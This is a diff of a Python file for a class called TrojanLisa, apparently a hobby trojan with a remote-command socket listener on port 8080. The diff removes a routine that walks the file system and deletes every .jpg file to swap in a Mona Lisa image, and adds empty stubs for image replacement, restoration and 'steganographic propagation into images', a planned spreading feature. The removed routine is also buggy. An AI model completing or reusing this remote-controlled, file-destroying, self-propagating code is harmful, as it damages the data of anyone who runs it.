@@ -20,40 +20,38 @@ class TrojanLisa:
                     resp = data.decode()
                     print(resp)
                     self.execute(resp)
-                    message = "Message from server"
+                    message = "Server established"
                     conn.send(message.encode())
                 except:
                     break
             conn.close()
             print("Client disconnected")
 
+    """ Steganographic propagation into images. """
+    def propagate(self):
+        pass
+
+    """ Execute command passed from RAT interface. """
     def execute(self, command):
         if command == "1":
             print("Replacing images with Mona Lisa...")
-            self.enumerate_fs()
+            self.replace_images(os.curdir)
+        if command == "2":
+            print("Restoring original images...")
+            self.restore_images(os.curdir)
+        else:
+            print("Invalid command.")
 
-    """ Steganographic executable propagation into other images. """
-    def propagate(self):
-        # TODO: Write excutable propagation
+    """ Replace images within a specified directory and all its children """
+    def replace_images(self, root_dir):
         pass
 
-    """ Enumerate through file system and list all jpg files. """
-    def enumerate_fs(self):
-        # TODO: Change filetype to image that allows executable embeddings
-        rootdir = "." + os.sep
-        rootlisa = ".." + os.sep + "img" + os.sep + "mona_lisa.jpg"
-        print(rootdir, rootlisa)
-        for subdir, dirs, files in os.walk(rootdir):
-            for file in files:
-                filepath = subdir + os.sep + file
-
-                if filepath.endswith(".jpg"):
-                    print("Overwriting...", filepath)
-                    test = os.path.join(rootdir, file)
-                    print(test)
-                    os.remove(test)
-                    shutil.copy(test, rootlisa)
+    """ Restore images to original state within a specified directory and all its children """
+    def restore_images(self, root_dir):
+        pass
             
 if __name__=="__main__":
     trojan_lisa = TrojanLisa()
-    trojan_lisa.host('0.0.0.0', 8080)
+    #trojan_lisa.host('0.0.0.0', 8080)
+    trojan_lisa.replace_images(".")
+    trojan_lisa.restore_images(".")
